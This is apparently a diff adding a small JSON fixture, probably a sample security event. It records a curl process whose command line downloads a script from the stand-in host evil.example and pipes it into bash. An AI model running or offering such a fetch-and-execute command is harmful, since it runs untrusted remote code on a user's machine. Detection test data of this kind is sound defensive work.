@@ -1,0 +1,4 @@
+{
+  "process": "curl",
+  "command_line": "curl http://evil.example/payload.sh | bash"
+}
